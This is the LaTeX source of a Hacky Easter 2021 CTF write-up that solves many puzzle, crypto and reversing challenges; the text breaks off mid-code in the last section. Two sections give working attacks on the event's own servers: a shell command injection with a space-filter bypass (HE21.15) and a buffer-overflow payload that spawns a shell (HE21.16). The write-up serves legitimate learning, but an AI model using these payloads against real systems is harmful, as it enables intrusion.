@@ -1,0 +1,2272 @@
+\documentclass[english,a4paper,nols,noindent]{tufte-handout}
+\usepackage[english]{babel}
+%\usepackage{longtable}
+%\usepackage{lscape}
+\usepackage{graphicx}
+\usepackage{minted}
+\usepackage{booktabs}
+\usepackage{listings}
+\usepackage{fancyvrb}
+\usepackage{fvextra}
+\usepackage{enumitem}
+\usepackage{microtype}
+\usepackage{pmboxdraw}
+\DisableLigatures{encoding = *, family = * }
+\setlist{nolistsep}
+%\setlist{nosep}
+%\usepackage{harfload}
+%\usepackage{latexsym}
+%\usepackage[square]{natbib}
+\usepackage{fontspec}
+%\newfontfamily{\NotoEmoji}{Noto Color Emoji}
+%\newcommand*{\NotoEmoji}{\fontfamily{NotoColorEmoji}\selectfont}
+\newfontfamily{\NotoEmoji} {NotoColorEmoji.ttf}[Renderer=Harfbuzz]
+\newfontfamily{\NotoSymbol} {NotoSansSymbols-Regular.ttf}[Renderer=Harfbuzz]
+\newfontfamily{\NotoSymbolTwo} {NotoSansSymbols2-Regular.ttf}%[Renderer=Harfbuzz]
+\newfontfamily{\NotoMono} {NotoSansMono-Regular.ttf}[Renderer=Harfbuzz]
+%\setmainfont{Linux Libertine O}% or Minion Pro or what have you
+%\setmainfont{Noto Sans}% or Minion Pro or what have you
+%\parindent=0pt
+%\special{papersize=210mm,297mm}%
+% Set up the spacing using fontspec features
+\renewcommand\allcapsspacing[1]{{\addfontfeature{LetterSpace=15}#1}}
+\renewcommand\smallcapsspacing[1]{{\addfontfeature{LetterSpace=10}#1}}
+
+\title{Hacky Easter 2020 write-up}
+\author{brp64}
+\date{2021-05-31}
+
+\begin{document}
+
+\maketitle
+
+  
+\hypertarget{he21.-1}{%
+  \section{HE21.(-1) Teaser Challenge}
+  \label{sec:HE21.-1}}
+
+\begin{marginfigure}
+  \includegraphics[width=50mm]{images/banner.jpg}
+\end{marginfigure}
+Ed wrote you a letter containing strange symbols: 
+\verb+;85)8( )‡0¶8† -‡*3(5;)+
+Can you recover the message?
+
+
+\hypertarget{HE21.-1}{%
+\subsection{HE21.(-1) Solution}\label{he21.-1}}
+The image of E. A. Poe directs us towards his cryptography claims,
+mainly that he could solve any substitution cipher.  With some guess
+work using ``teaser'' as a crib for the first word, we quickly find
+the solution \verb+teaser solved congrats+
+
+An alternate approach is to investigate his book ``The golden bug''
+where this substitution cipher is taken from.
+
+\hypertarget{HE21.01-first-egg}{%
+\section{HE21.01 First egg}\label{HE21.01-first-egg}}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge1.jpg}
+\end{marginfigure}
+\subsection{Intro}
+Well, this is not a real challenge yet, just a quick intro. Some would say sanity check.
+
+\subsection{Event}
+
+\begin{itemize}
+  \item The event runs until May 13, 13:37 CET.
+  \item Please do not publish write-ups, before that.
+  \item There's a Discord server, in case you need support.
+\end{itemize}
+
+\subsection{Challenges}
+
+\begin{itemize}
+  \item Challenges have difficulty noob, easy, medium, or hard.
+  \item Some challenges have a hint - opening the hint is free.
+\end{itemize}
+
+\subsection{Flags}
+
+\begin{itemize}
+  \item Flag format: \verb+he2021{just_4n_3x4mpl3}+.
+  \item There are no flags / eggs hidden in the application - please do not attack it.
+\end{itemize}
+
+\subsection{Levels}
+
+\begin{itemize}
+  \item With a certain amount of points scored in the current level, you level up.
+  \item You can always go back to earlier levels.
+  \item That's it for now. Check the HowTo for more details.
+\end{itemize}
+
+Time to catch the first flag now! Download the image below.
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch01/first_egg.png}
+%\caption{day01/card.png}
+\end{marginfigure}
+
+\hypertarget{he21.01-solution}{%
+\subsection{HE21.01 Solution}\label{he21.01-solution}}
+
+Just read the flag backwards.
+
+\hypertarget{he21.02}{%
+\section{HE21.02 Basement Cat}\label{he21.02}}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge2.jpg}
+\end{marginfigure}
+Hi, me iz \textbf{Base}ment Cat!
+
+\noindent Here iz flag: \verb+5jsnZDgv9EfFeoGXZrFurdz7MWAnK2WaPfszFadr+
+
+\subsection{Show hint (free)}
+
+\begin{itemize}
+\item The number on the image, is a hint! {\NotoEmoji 😉}
+\item Check out Cyber Chef.
+\end{itemize}
+
+\hypertarget{he21.02-solution}{%
+\subsection{HE21.02 Solution}\label{he21.02-solution}}
+
+The text is base58 encoded, using Cyber Chef it can be converted to
+the flag \verb+he2021{meow_nice_to_meet_you}+.
+
+\hypertarget{he21.03}{%
+\section{HE21.03 Easy One}\label{he21.03}}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge3.jpg}
+\end{marginfigure}
+
+\noindent How did this happen? This was suppossed to be a
+valid QR code, but some ants walked across it. Can you repair the
+damage?
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch03/easyone.png}
+\end{marginfigure}
+
+\hypertarget{he21.03-solution}{%
+\subsection{HE21.03 Solution}\label{he21.03-solution}}
+
+\noindent The file just contains the outline of the QR-code, one line
+of pixels is all blacked out, so a fill will have the white bleed into
+areas that should be black.  Use Gimp to correct the interrupted white
+lines and then start filling with white where appropriate.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch03/easyone_solved.png}
+\end{marginfigure}
+
+\newpage
+\hypertarget{he21.04}{%
+  \section{HE21.04 Beehive}
+  \label{he21.04}}
+% \section{HE21.04 Beehive}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge4.jpg}
+\end{marginfigure}
+
+
+\noindent There's a secret code in the beehive.
+
+\noindent {\NotoSymbol ⚑} format: \verb+he2021{flaglower}+.
+
+\noindent Lowercase only, and no spaces!
+
+\subsection{Hints}
+Kim Godgul
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch04/beehive.png}
+\end{marginfigure}
+
+
+\hypertarget{he21.04-solution}{%
+\subsection{HE21.04 Solution}\label{he21.04-solution}}
+
+\noindent The hint points us towards some alphabets introduced by Kim
+Godgul and we find the
+\url{https://omniglot.com/conscripts/colorhoney.php} that shows the
+ColorHoney alphabet.  With this we get the flag \verb+he2021{busybee}+
+
+\hypertarget{he21.05}{%
+\section{HE21.05 Unicorn}\label{he21.05}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge5.jpg}
+\end{marginfigure}
+
+\noindent {\NotoEmoji 🦄} Ain't no CTF without a unicorn! {\NotoEmoji 🦄}
+
+\begin{verbatim}
+s7GvyM1RKEstKs7Mz7NVMtQzUFJIzUvO  
+T8nMS7dVCg1x07VQsrfj5bJJzs9LL0os  
+KQayFRRs0nIS0+0yUo0MjAyrS/MMkw2K  
+8uIN84CiJcbGximKtTb6YBVAffpwjQA=  
+\end{verbatim}
+
+\subsection{Show Hint (free)}
+Decode and inflate!
+
+\hypertarget{he21.05-solution}{%
+\subsection{HE21.05 Solution}\label{he21.05-solution}}
+
+The flag seems to be base64 encoded, so head over to Cyber Chef, but
+the result does not resemble anything sensible. So look at the hint
+and try to use the inflate the result and get:
+
+\begin{verbatim}
+<?xml version="1.0" encoding="UTF-8"?>
+<congrats>
+  <flag>he2021{un1c0rn_1nflat333d!}</flag>
+</congrats>
+\end{verbatim}
+
+\subsection{References}
+\url{https://en.wikipedia.org/wiki/Deflate}
+
+
+\hypertarget{he21.06}{%
+  \section{HE21.06 Mystical Symbols}
+  \label{he21.06}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge6.jpg}
+\end{marginfigure}
+
+\noindent I found these mystical symbols.
+
+\noindent What do they mean?
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item Really \textbf{myst}ical, isn't it?
+\item decimal to ascii
+\end{itemize}
+
+\begin{figure}
+    \includegraphics[width=150mm]{ch06/symbols.png}
+\end{figure}
+
+
+\hypertarget{he21.06-solution}{%
+\subsection{HE21.06 Solution}\label{he21.06-solution}}
+
+\noindent The symbols looked very familiar, but we could not figure
+out where they came from.  The hint then made it clear: the game Myst.
+A quick websearch finds
+\url{https://dni.fandom.com/wiki/Di\%27ni_Numerals}, which allows us
+to translate the symbols into integers: 83, 49, 114, 114, 117, 122
+
+These integers correspond to the ASCII string ``S1rruz'', or the flag \verb+he2021{S1rruz}+.
+
+\hypertarget{he21.07}{%
+\section{HE21.07 Caesar's Meme}\label{he21.07}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge7.jpg}
+\end{marginfigure}
+
+\noindent As is only little known, the ancient Romans invented the memes.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch07/caesarsmeme.jpg}
+\end{marginfigure}
+
+\hypertarget{he21.07-solution}{%
+\subsection{HE21.07 Solution}\label{he21.07-solution}}
+
+Caesar points towards Ceasar chiffre, so transcribe the text
+
+\verb+RQH GRHV QRW VLPSOB JHW WKLV IODJ: kh2021{lpshudwru}+
+
+\noindent into Cyber Chef and play around with the rot parameter.  For a shift
+of 23 we get the flag
+
+\verb+ONE DOES NOT SIMPLY GET THIS FLAG: he2021{imperator}+.
+
+\hypertarget{he21.08}{%
+\section{HE21.08 Sunshine}\label{he21.08}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge8.jpg}
+\end{marginfigure}
+
+\noindent The rays of sunshine are right there, in front of your eyes.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch08/sunshine.png}
+\end{marginfigure}
+
+\hypertarget{he21.08-solution}{%
+\subsection{HE21.08 Solution}\label{he21.08-solution}}
+
+Use scissors and a steady hand to glue the strips back together. Or find a suitable tool...
+
+\verb+he2021{0h_h3llo_sunsh1ne!}+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch08/solution08.jpg}
+\end{marginfigure}
+
+\hypertarget{he21.09}{%
+\section{HE21.09 Cafe Shop}\label{he21.09}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge9.jpg}
+\end{marginfigure}
+
+They have good things at the cafe shop, but I want a COLA - DECAF it must be!
+
+\noindent  Visit the shop here:
+\begin{itemize}
+\item \url{http://46.101.107.117:2104}
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item They also serve hash browns, for \$256.
+\end{itemize}
+
+\hypertarget{he21.09-solution}{%
+\subsection{HE21.09 Solution}\label{he21.09-solution}}
+
+This took some time to solve.
+
+The hint points towards the use of a hash function, probably of 256 bit length.
+After some playing around, we found that the order always consists of an eight
+digit number and a string, possibly of two words.  The words in all capitals in
+the order correspond to the name of the png-file shown with the order.
+
+A brute forcer to find all accepted solutions for "Vanilla Cafe" found many
+solutions, but for all three pictures.  Playing a bit more around with the
+order strings in Cyber Chef and searching for \verb+0xcafe+ showed that all
+accepted orders contained the sub-string \verb+cafe+ in the SHA256 of the full
+order string.  So the problem can be solved with brute force:
+
+\begin{minted}{python}
+import hashlib
+import re
+
+colaRe = re.compile(r'^.*(c01a).*$')
+decafRe = re.compile(r'^.*(decaf).*$')
+
+def hash(text):
+    m = hashlib.sha256()
+    m.update(text)
+    return m.hexdigest()
+
+for i in range(10000000,100000000):
+    s = b'%d Cola Decaf' % i
+    h = hash(s)
+    g = colaRe.search(h)
+    if g and decafRe.search(h):
+        print('found match for s: %s' % s)
+        print(h)
+\end{minted}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch09/7ef384aa6ec128ef.png}
+\end{marginfigure}
+
+The script prints out the solutions
+\begin{verbatim}
+'19614073 Cola Decaf'
+'96787682 Cola Decaf'
+\end{verbatim}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge10.jpg}
+\end{marginfigure}
+
+When sent to the order site using Postman, the order is acknowledged and the
+egg is displayed.
+
+
+\hypertarget{he21.10}{%
+\section{HE21.10 Ghost in a Shell 1}\label{he21.10}}
+{\footnotesize \begin{verbatim}
+  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    ,  
+ / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     |  
+ \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  
+  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~  
+______________________________________________________________________  
+ ,--.    
+| oo |   
+| ~~ |   o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  
+|/\/\|   
+______________________________________________________________________  
+\end{verbatim}}
+Connect to the server, snoop around, and find the flag!
+
+\begin{itemize}
+\item \verb+ssh 46.101.107.117 -p 2106 -l inky+
+\item password is: \verb+mucky_4444+
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\hypertarget{he21.10-solution}{%
+\subsection{HE21.10 Solution}\label{he21.10-solution}}
+
+Log into the service to find a bunch of files describing the game of
+pac-man.  There are two subdirectories, one named ``images'' with a
+bunch of pictures, one named ``texts'' with some descriptions of the
+adversaries.  Hidden in ``images'' is also a directory named ``...'',
+containing a file ``...''.  this file can be copied to the local host
+and contains the flag:
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch10/hidden.png}
+\end{marginfigure}
+\verb+he2021{h1dd3n_d0td0td0t!}+.
+
+\hypertarget{he21.11}{%
+\section{HE21.11 Hidden}\label{he21.11}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge11.jpg}
+\end{marginfigure}
+
+I swear I had the flag a minute ago, but now it seems to be hidden somewhere...
+
+Go back to level 3 and analyze the files of the challenges again. If
+you look hard enough, you can find an additional flag.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item The \textbf{sol}ution is hidden in an image. It's hidden in the
+  \textbf{file content}, not in the image (no steganography).
+\item There are some numbers in the flag: \verb+he2021{..0...........0...3.....5.}+.
+\end{itemize}
+
+\hypertarget{he21.11-solution}{%
+\subsection{HE21.11 Solution}\label{he21.11-solution}}
+Look into the files of level three. There is one -- sunshine.png --
+that matches the hint (in retrospect it is clear what was meant...).
+At the end of this PNG file is some ASCII text appended (2800
+characters).  If line breaks are inserted every 16 characters, this
+pattern emerges:
+
+\begin{verbatim}
+0  _              
+1 | |__           
+2 | '_ \          
+3 | | | |         
+4 |_| |_|         
+5   ___           
+6  / _ \          
+7 |  __/          
+8  \___|          
+9  ____           
+10 |___ \          
+11   __) |         
+12  / __/          
+13 |_____|         
+14   ___           
+15  / _ \          
+16 | | | |         
+17 | |_| |         
+18  \___/          
+19  ____           
+20 |___ \          
+21   __) |         
+22  / __/          
+23 |_____|         
+24  _              
+25 / |             
+26 | |             
+27 | |             
+28 |_|             
+29
+\end{verbatim}
+
+Properly transcribed, this gives the flag \verb+he2021{Wh0_is_scared_0f_h3xdump5?}+
+
+And in fact, opening the characters in hexl-mode in Emacs, shows the pattern right away...
+
+
+\hypertarget{he21.12}{%
+\section{HE21.12 Ansi Art}\label{he21.12}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge12.jpg}
+\end{marginfigure}
+
+Hope you like my ansi art egg!
+
+\begin{itemize}
+\item Get it with \verb+nc 46.101.107.117 2105+
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\hypertarget{he21.12-solution}{%
+\subsection{HE21.12 Solution}\label{he21.12-solution}}
+
+Logging into the service spews out a picture of an egg, but with no
+writing.  Dumping the output into a file shows that it contains mostly
+ANSI terminal control sequences.  Poking around, we find that if we
+seach for the letter ``h'', we find a sequence ending with ``h'', then
+a sequence ending with ``e'', so this is probably the flag.  Manually
+stripping out the control sequences, we get the flag
+\verb+he2021{4Ns1MG1k}+
+
+
+\hypertarget{he21.13}{%
+  \section{HE21.13 No No No}
+  \label{he21.13}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge13.jpg}
+\end{marginfigure}
+
+\noindent No! No... nono ..
+
+\noindent Where's the egg???
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item Using a tool might be a good idea here.
+\item There is a small glitch - if you don't get a solution, try something else.
+\end{itemize}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch13/nonobunnygram.png}
+\end{marginfigure}
+
+
+\hypertarget{he21.13-solution}{%
+\subsection{HE21.13 Solution}\label{he21.13-solution}}
+
+\noindent The picture shows a nomogram and online there are many
+solvers.  We used \url{http://a.teall.info/nonogram}, reading off the
+numbers by hand.  The solver does not find a complete solution, but
+the error correction of the QR-code is good enough to allow the flag
+to be read.
+
+\verb+he2021{Y3sY3sY3sgram_s0unds_a_l0t_nic3r}+.
+\begin{figure}
+    \includegraphics[width=150mm]{ch13/solution13.png}
+\end{figure}
+
+\pagebreak
+\hypertarget{he21.14}{%
+  \section{HE21.14 Haxxor what?}
+  \label{he21.14}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge14.jpg}
+\end{marginfigure}
+
+I got this image of an Easter egg.
+
+\noindent  But what kind of encryption is this?!
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item The original file is an image
+\end{itemize}
+
+
+\hypertarget{he21.14-solution}{%
+\subsection{HE21.14 Solution}\label{he21.14-solution}}
+
+\noindent The file is a binary file, from the hint and the title we assume that
+it is XOR'ed with a constant key.  Assuming a PNG file, we can use the first few
+bytes as a crib and get the key:
+\begin{itemize}
+\item See \url{http://libpng.org/pub/png/spec/1.2/PNG-Structure.html} for the
+    file signature (decimal): 137 80 78 71 13 10 26 10
+\item Use Cyber Chef to XOR this signature with the file to get this key: \verb+haxxors!+
+\end{itemize}
+
+\noindent Then XOR the file using \verb+xortools-xor+
+
+\begin{verbatim}
+% xortool-xor -r 'haxxors!' -f haxxorwhat  >output.png 
+\end{verbatim}
+
+\noindent to get the egg and the flag
+\verb+he2021{r34l_x0r_h4xx0r}+.
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch14/output.png}
+\end{marginfigure}
+
+\hypertarget{he21.15}{%
+  \section{HE21.15 Social Checker}
+  \label{he21.15}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge15.jpg}
+\end{marginfigure}
+
+\noindent Social Checker - check if your favourite social media site is online!
+
+\begin{itemize}
+\item \url{http://46.101.107.117:2103}
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item Some characters are blocked - find a workaround!
+\end{itemize}
+
+
+\hypertarget{he21.15-solution}{%
+\subsection{HE21.15 Solution}\label{he21.15-solution}}
+
+\noindent The application lets us choose a web-site from a list and tells us if
+it can ping it.  So let's try to test our own sites by injecting our data into
+the \verb+url+ form parameter.
+
+Looking for \verb+twitter$.com+ shows \verb+nc: bad address 'twitter$.com'+.
+So the value is sent to nc and it reflects it to us.  Try to inject some data
+into the call \verb+$(ls /)+, but this is rejected 
+\verb+nice try - www.youtube.com/watch?v=a4eav7dFvc8+. However, we
+resist the urge to click on this url.
+
+Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  So the url
+is passed on to \verb+nc+ and it is interpreted before by the shell.  So let us
+interpret the output of \verb+ls+ as a string (\verb+"$(ls)"+)and see what it
+does:
+\begin{verbatim}
+nc: bad address 'bg.jpg
+check.php
+flag.txt
+index.php'
+\end{verbatim}
+
+There is a file \verb+flag.txt+ in the directory, so we can show its contents
+with \verb+"$(cat${IFS}flag.txt)"+.  The IFS is necessary to bypass the
+detection of spaces.  And we get the flag
+
+\begin{verbatim}
+nc: bad address 'he2021{1ts_fun_t0_1nj3kt_k0mmand5}'
+\end{verbatim}
+
+\hypertarget{he21.16}{%
+  \section{HE21.16 LOTL}
+  \label{he21.16}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge16.jpg}
+\end{marginfigure}
+
+Save the planet!
+
+\noindent Well, we should then better LOTL and use what we have, right?
+\begin{itemize}
+
+\item \verb+nc 46.101.107.117 2102+
+\item Get a shell and read the flag.
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\noindent Executable ``lotl'' is provided.
+
+\hypertarget{he21.16-solution}{%
+\subsection{HE21.16 Solution}\label{he21.16-solution}}
+
+\noindent The provided executable can be analysed using Ghidra and shows a main
+function with a classic buffer overflow problem from using \verb+gets+:
+
+\begin{minted}{c}
+undefined8 main(void)
+{
+  char pwn_me [32];
+  
+  ignore_me_init_buffering();
+  ignore_me_init_signal();
+  printf("Welcome! Please give me your name!\n> ");
+  gets(pwn_me);
+  printf("Hi %s, nice to meet you!\n",pwn_me);
+  return 0;
+}
+\end{minted} 
+
+So we can to overflow the buffer and jump to a proper place to get us a shell. 
+Really interesting is the function \verb+profit+ at address \verb+0x0040086d+
+\begin{minted}{c}
+void profit(void)
+{
+  system("/bin/sh");
+  return;
+}
+\end{minted}
+
+So it should be easy to construct the payload: load 32 bytes for the buffer, 8
+bytes for the RBP and then 8 bytes for the RIP.  However, this does not work.
+In the end, it turns out that the binary did not match the challenge and only a
+padding of 32 bytes was needed:
+
+\begin{verbatim} 
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD\x6d\x08\x40\x00\x00\x00\x00\x00\nls -l\ncat flag\n" |
+nc 46.101.107.117 2102
+Welcome! Please give me your name!
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD@, nice to meet you!
+total 36
+-rwxrwxr-x 1 root root  8848 Mar  2 18:30 challenge1
+-rw-rw-r-- 1 root root    40 Mar  2 18:30 flag
+-rwxrwxr-x 1 root root 18744 Mar  2 18:30 ynetd
+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
+\end{verbatim} 
+
+The flag is \verb+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}+
+
+
+\hypertarget{he21.17}{%
+  \section{HE21.17 Digizzled}
+  \label{he21.17}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge17.jpg}
+\end{marginfigure}
+
+\noindent Had a flag, but it got digizzled. Can you recover it?
+
+\begin{verbatim}
+-------------------------------------  
+      o                  o             
+      | o      o         |             
+    o-O   o--o   o-o o-o | o-o o-o     
+   |  | | |  | |  /   /  | |-' |       
+    o-o | o--O | o-o o-o o o-o o       
+             |                         
+         o--o                          
+-------------------------------------
+enter flag: [REDACTED]    
+digizzling...  
+c5ab05ca73f205ca  
+\end{verbatim}
+
+A file ``digizzle'' is given.
+
+\hypertarget{he21.17-solution}{%
+\subsection{HE21.17 Solution}\label{he21.17-solution}}
+
+\noindent The file is a dump of disassembled python bytecode; check the
+documentation on the module \verb+dis+ at \url{https://docs.python.org/3.7/library/dis.html?highlight=dis#module-dis}.  If python 3.7 is used, the
+disassembly can be reproduced by this code:
+
+\begin{minted}{python}
+import re
+pattern = re.compile('^he2021\\{([dlsz134]){9}\\}$')
+
+def hizzle(s):
+    s1 = 13
+    s2 = 37
+    for n in range(len(s)):
+        s1 = (s1 + ord(s[n])) % 65521
+        s2 = (s1 * s2) % 65521
+    return (s2 << 16) | s1
+
+def smizzle (a,b):
+    return format(a, 'x') + format(b, 'x')
+
+print('-------------------------------------')
+print('      o                  o           ')
+print('      | o      o         |           ')
+print('    o-O   o--o   o-o o-o | o-o o-o   ')
+print("   |  | | |  | |  /   /  | |-' |     ")
+print('    o-o | o--O | o-o o-o o o-o o     ')
+print('             |                       ')
+print('         o--o                        ')
+print('-------------------------------------')
+s = input('enter flag:')
+res = pattern.match(s)
+if res:
+    print('digizzling...')
+    a = hizzle(s)
+    b = hizzle(s[::-1])
+
+    print(smizzle(a,b))
+
+else:
+    print('wrong format!')  
+  \end{minted}
+
+  We know the expected result for the flag and build a brute forcing
+  loop.  Since the function \verb+smizzle+ does only a conversion from
+  integer to string and then a string concatenation, we can leave it
+  away and compare directly with integers.
+
+  \begin{minted}{python}
+    alph = 'dlsz134'
+    
+    for c1 in alph:
+    for c2 in alph:
+    print(c2)
+    for c3 in alph:
+            for c4 in alph:
+                for c5 in alph:
+                    for c6 in alph:
+                        for c7 in alph:
+                            for c8 in alph:
+                                for c9 in alph:
+                                    s = 'he2021{' + c1 + c2 + c3+ c4 + \\
+                                          c5 + c6+ c7 + c8 + c9 + '}'
+                                    a = hizzle(s)
+                                    if a == 0xc5ab05ca:
+                                        b = hizzle(s[::-1])
+                                        if b == 0x73f205ca:
+                                            print(s)
+                                            print(smizzle(a,b))
+                                            sys.exit(0)
+  
+  \end{minted}
+
+The flag is \verb+he2021{d1s4zzl3d}+
+
+\hypertarget{he21.18}{%
+  \section{HE21.18 Bunny Beat}
+  \label{he21.18}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge18.jpg}
+\end{marginfigure}
+
+\noindent The bunnies have discovered minimal beats!
+
+\begin{itemize}
+\item But where is the flag?
+\item Wave file \verb+bunnybeat.wav+ is given.
+\end{itemize}
+
+\hypertarget{he21.18-solution}{%
+\subsection{HE21.18 Solution}\label{he21.18-solution}}
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch18/spectrogram.png}
+\end{marginfigure}
+
+\noindent Look at the wave file in Sonic Visualiser and check out the
+spectrogram.  Then the flag stands out immediately:\\
+\noindent\verb+he2021{Sp3ctrogramsROCK!}+.
+
+
+\hypertarget{he21.19}{%
+  \section{HE21.19 😈}
+  \label{he21.19}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge19.jpg}
+\end{marginfigure}
+
+\noindent One of the bunnies made a new friend. But when asked for the name, he only got the response below.
+
+Can you find out the friend's name, in UPPERCASE?
+
+%\begin{verbatim*}
+{\NotoEmoji
+▫️▫️😈😈▫️▫️▫️😈▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️\\
+▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️\\
+▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️😈😈▫️\\
+▫️▫️😈😈▫️😈😈▫️▫️▫️😈😈▫️😈😈▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️\\
+▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️\\
+▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️\\
+▫️▫️😈😈▫️▫️▫️😈 }
+%\end{verbatim*}
+
+\noindent {\NotoSymbol ⚑} format: \verb+he2021{JOHNDOE}+
+
+\subsection{Show Hint (free)}
+\begin{itemize}
+\item We need the name of what you find, in UPPERCASE, and wrapped in he2021{...}.
+\end{itemize}
+
+
+\hypertarget{he21.19-solution}{%
+\subsection{HE21.19 Solution}\label{he21.19-solution}}
+
+\noindent This was supposed to be easy, but it took us longer than
+many others so far.  The input string contains two symbols that can be
+translated to a binary representation and, when chopped into 8 bit
+pieces, interpreted as characters.  This gives us a string
+\verb+1000000000000066600000000000001+.  After many futile attempts,
+we found that it is called ``Belphegor's prime'' and so the flag is
+\verb+he2021{BELPHEGOR}+.
+
+\hypertarget{he21.20}{%
+  \section{HE21.20 Run Me, Baby!}
+  \label{he21.20}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge20.jpg}
+\end{marginfigure}
+
+This one's easy, ain't it? Just run the .class file. Hope you like Java!
+
+\noindent Class file \verb+runme.class+ is given.
+
+\hypertarget{he21.20-solution}{%
+\subsection{HE21.20 Solution}\label{he21.20-solution}}
+
+\noindent The class file is not from a Java program, but from a Groovy
+program.  Decompiling the class file using cfr gave a quite convoluted
+java file.  Since the challenge is labelled as easy, we tried to run
+the Groogy program directly.  But when we failed, we quickly re-wrote
+it in python to get the flag \verb+he2021{isnt_17_gr00vy_baby?}+
+
+\begin{minted}{python}
+s = [1, 6, 7, 3, 2, 9, 4, 5, 3, 4, 8, 9, 1, 7, 3, 2, 3, \
+    3, 7, 8, 7, 3, 2, 4, 5, 3, 5, 1, 3, 0, 3, 4, 5, 5]
+cipher = "ik934:\u007fnvr|h2>biu37~\u0080bdeg|D~"
+sol = ''
+
+for i in range(len(cipher)):
+    t = ord(cipher[i]) - s[i]
+    sol += chr(t)
+print(sol)
+\end{minted}
+
+\hypertarget{he21.21}{%
+  \section{HE21.21 Memeory 3.0 -- The Finale}
+  \label{he21.21}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge21.jpg}
+\end{marginfigure}
+
+\noindent We finally fixed Memeory 2.0 and proudly release Memeory 3.0 aka the supersecure-Memeory.
+
+\begin{itemize}
+\item Flagbounty for everyone who can solve 10 successive rounds. Time per round is 30 seconds and only 3 missclicks are allowed.
+\item \url{http://46.101.107.117:2107}
+\end{itemize}
+Note: The service is restarted every hour at x:00.
+
+\noindent Class file \verb+runme.class+ is given.
+
+\hypertarget{he21.21-solution}{%
+\subsection{HE21.21 Solution}\label{he21.21-solution}}
+
+\noindent This is an extension of an older challenge: play memory on-line.  The
+path to solve it remains the same: load all images (labelled from 1 to 98),
+identify which ones are the same and the post the proper pairs.  Compared to
+the last installment, the images can be rotated and so we have to identify
+them.  This is a similar task as in HackyEaster 2019, 'Egg CAPTCHA'.  Basically
+write some code to compare all possible orientation of a picture with another
+picture and calculate a figure of merit.  I chose an rms distance and this
+worked well:
+
+\begin{minted}{python}
+import requests
+import numpy as np
+from PIL import Image
+
+
+def mse(im1_arr, im2_arr):
+    #diff = im1_arr - im2_arr
+    err = np.sum((im1_arr - im2_arr) ** 2)
